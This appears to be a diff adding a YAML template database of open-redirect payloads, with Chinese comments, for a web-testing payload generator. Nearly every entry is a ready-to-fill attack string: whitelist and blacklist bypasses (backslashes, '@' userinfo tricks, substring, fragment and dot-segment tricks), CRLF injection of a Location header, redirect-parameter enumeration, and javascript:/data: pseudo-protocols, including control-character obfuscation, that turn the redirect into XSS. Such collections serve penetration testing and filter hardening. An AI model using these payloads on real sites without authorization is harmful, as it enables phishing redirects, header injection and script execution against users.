@@ -1,0 +1,345 @@
+ruleDB: v0.1.0
+# 开放重定向模板。content_type 用 url——和 ssrf/generic.yaml 一样，
+# 载荷本身就是个 URL，只是这里的 URL 是喂给「跳转地址」这个可控点的。
+#
+# 两个自由变量，**都不给默认值**（契约 3：漏填保留 <<名字>> 字面量）：
+#   <<evil>>     要跳到哪，攻击者控制的那个域名
+#   <<trusted>>  目标自己信任的域名，只在「对白名单做手脚」的条目里出现
+#
+# `<<scheme>>` 是槽位（http / https），带协议头的载荷都走它，省得一条写两遍。
+# 注意它和请求中间态里的 state["scheme"] 不是一回事——后者是提交层的基址协议，
+# 由 output._base_url 读取，和这个槽位无关。
+#
+# requires 的取舍（这张表是筛选器，多写会让用户勾了「目标没有 X」后仍看到用不上的模板）：
+#   redirect-sink  每条都加：参数不被当成跳转地址时，这些串一个都不成立
+#   weak-filter    只加给「专门绕白名单/黑名单」的条目：要么载荷里嵌了信任域名
+#                  （没有过滤器时它严格劣于绝对地址），要么把 URL 写成过滤器认不出、
+#                  浏览器却认得的形态。目标没有过滤时直接看 redirect.generic.absolute。
+#   reflect        javascript: / data: 这类要靠浏览器执行的才加
+#
+# 跳转目标的等价写法（十进制 IP、十六进制、八进制、IPv6 字面量）沿用
+# data/bypasses.yaml 的 bypass.ip.*，不在模板里重复实现。
+
+templates:
+  - id: redirect.generic.absolute
+    name: 绝对地址跳转
+    desc: 最基础的一条，先用它确认参数真的会被当跳转地址；应用只做「是不是 http 开头」这类检查时也能直接过
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: https}
+    body: "<<scheme>>://<<evil>>/"
+    vars: [evil]
+    requires: [redirect-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.relative.protocol
+    name: 协议相对地址
+    desc: 不写协议，浏览器按当前页面的协议补全；最常用来绕「必须以 http 开头」的检查
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    body: "//<<evil>>/"
+    vars: [evil]
+    requires: [redirect-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.scheme.less_slash
+    name: 单斜杠省略写法
+    desc: 协议头后不写双斜杠，浏览器仍按绝对地址补全成 https://evil/；过滤器若按「://」判断是不是绝对地址就会漏掉它
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: https}
+    body: "<<scheme>>:<<evil>>"
+    vars: [evil]
+    requires: [redirect-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.backslash.mixed
+    name: 反斜杠混斜杠
+    desc: 浏览器把 \ 归一成 /，这个串会解析成 https://evil/；只按明文做 URL 白名单校验的服务端认不出它
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: https}
+    # 单引号：YAML 里只有双引号才处理转义，反斜杠在这里是字面量
+    body: '<<scheme>>:/\<<evil>>'
+    vars: [evil]
+    requires: [redirect-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.backslash.leading
+    name: 反斜杠协议相对
+    desc: 两个反斜杠开头，浏览器归一成 // 后按当前协议跳走；只在 Location 或前端跳转里成立，服务端 URL 解析器大多不认
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    # 单引号：两个反斜杠就是要发给目标的两个字符
+    body: '\\<<evil>>'
+    vars: [evil]
+    requires: [redirect-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.userinfo.at
+    name: userinfo 混淆
+    desc: 应用用「URL 里是否包含白名单域名」判断时会误判成合法，浏览器只认 @ 后面那段是主机
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: https}
+    body: "<<scheme>>://<<trusted>>@<<evil>>/"
+    vars: [evil, trusted]
+    requires: [redirect-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.whitelist.subdomain
+    name: 白名单子串匹配（子域名）
+    desc: 白名单做子串匹配时把信任域名拼成子域名，真正的 authority 是后面那截，攻击者控制它的 DNS 就成立
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: https}
+    body: "<<scheme>>://<<trusted>>.<<evil>>/"
+    vars: [evil, trusted]
+    requires: [redirect-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.whitelist.query_bare
+    name: 白名单子串匹配（裸 query）
+    desc: 把信任域名当裸 query 参数挂上去，主机仍然是 evil；专门骗「URL 里出现过本域名」的包含式判断
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: https}
+    body: "<<scheme>>://<<evil>>/?<<trusted>>"
+    vars: [evil, trusted]
+    requires: [redirect-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.userinfo.at_encoded
+    name: userinfo 编码混淆
+    desc: 用 %40 代替 @。过滤器不解码、下游拿到参数却会先解码再当 URL 用时才成立，浏览器直接解析这一串是解析不出主机的
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: https}
+    body: "<<scheme>>://<<trusted>>%40<<evil>>/"
+    vars: [evil, trusted]
+    requires: [redirect-sink, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.fragment
+    name: 片段混淆
+    desc: "井号后面的内容不会发给服务端，只用来骗包含式检查；浏览器照样跳到 evil"
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: https}
+    body: "<<scheme>>://<<evil>>/#<<trusted>>"
+    vars: [evil, trusted]
+    requires: [redirect-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.whitelist.query_kv
+    name: 白名单子串匹配（带参数名）
+    desc: 和裸 query 那条同一个思路，目标过滤器要求 query 形如 key=value、或正则只认带等号的形态时才用它
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: https}
+    body: "<<scheme>>://<<evil>>?x=<<trusted>>"
+    vars: [evil, trusted]
+    requires: [redirect-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.slashes.multi
+    name: 多重斜杠
+    desc: 过滤只删一次前导 // 时，四个斜杠被删掉一层正好还原成协议相对地址
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    body: "////<<evil>>/"
+    vars: [evil]
+    requires: [redirect-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.dot_segment
+    name: 点段折叠绕过
+    desc: 只在服务端先折叠点段、再把折出来的 //evil 当 authority 的实现上成立，浏览器自己会折回信任域名，所以别当首选
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: https}
+    body: "<<scheme>>://<<trusted>>/..//<<evil>>/"
+    vars: [evil, trusted]
+    requires: [redirect-sink, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.crlf.location
+    name: CRLF 注入 Location
+    desc: 参数回显进响应头且没过滤 CR/LF 时直接注入一个 Location 头，等于把普通跳转升级成响应头注入
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: [http, https], default: https}
+    # 单引号：值以 % 开头，不加引号 YAML 解析直接失败（% 是保留指示符）
+    body: '%0d%0aLocation:%20<<scheme>>://<<evil>>/'
+    vars: [evil]
+    requires: [redirect-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.param.enum
+    name: 跳转参数名枚举
+    desc: 不知道目标用哪个参数名时逐个试这组常见名字，地址部分用最普通的绝对地址
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      pname:
+        options: [next, url, redirect, to, return, returnUrl, continue, dest, goto]
+        default: next
+      scheme: {options: [http, https], default: https}
+    body: "?<<pname>>=<<scheme>>://<<evil>>/"
+    vars: [evil]
+    requires: [redirect-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.scheme.javascript
+    name: javascript 伪协议
+    desc: 输入会回显进 href 或 window.location 时可用，等于把开放重定向升级成 XSS；响应头里的 javascript 现代浏览器已不执行
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    body: "javascript:alert(document.domain)"
+    vars: []
+    requires: [redirect-sink, reflect]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: redirect.generic.scheme.data
+    name: data 伪协议
+    desc: 少数老浏览器和 WebView 会执行，现代浏览器已禁止顶层导航到它；多在应用自己抓取这个 URL 时才有意义
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    body: "data:text/html;base64,<<b64>>"
+    vars: [b64]
+    requires: [redirect-sink, reflect]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 协议名的变形 ----
+  # 上面那两条伪协议是**明写**的（黑名单一眼能看见）。这条把协议名拆开，
+  # 只有浏览器那侧的 URL 解析器才把它拼回去。
+
+  - id: redirect.generic.scheme.ctrl_char
+    name: 协议名里插控制字符
+    desc: >-
+      黑名单按明文 javascript: 匹配时用。URL 解析前会把 TAB、LF、CR 全部剥掉，
+      所以 java 加一个 TAB 再加 script: 到浏览器手里仍然是 javascript 伪协议，
+      过滤器却看不见它。前三个选项是**真的控制字符**，值直接落在 href / window.location
+      里时用；后两个是百分号编码形态，只在值会先被解码一次再当 URL 用时成立
+      （原样写进去的话浏览器看到的是字面的 %09，协议名认不出来）。作为 Location 头时
+      现代浏览器已不执行 javascript:，那种场合它只是绕过过滤器、没有实际效果。
+      它绕的是「按明文匹配」这一类过滤器，目标用真正的 URL 解析器判断时无用。
+    vuln: [redirect]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      ctrl:
+        options:
+          - {id: tab_raw,  name: "真 TAB 字符（值落在属性里时用）",    seq: "\t"}
+          - {id: lf_raw,   name: "真 LF 字符",                        seq: "\n"}
+          - {id: cr_raw,   name: "真 CR 字符",                        seq: "\r"}
+          - {id: tab_enc,  name: "%09（值会先被解码一次时用）",        seq: "%09"}
+          - {id: crlf_enc, name: "%0d%0a（值会先被解码一次时用）",     seq: "%0d%0a"}
+        default: tab_raw
+      js:
+        options: ["alert(1)", "alert(document.domain)"]
+        default: "alert(1)"
+    body: "java<<ctrl.seq>>script:<<js>>"
+    vars: []
+    requires: [redirect-sink, reflect, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
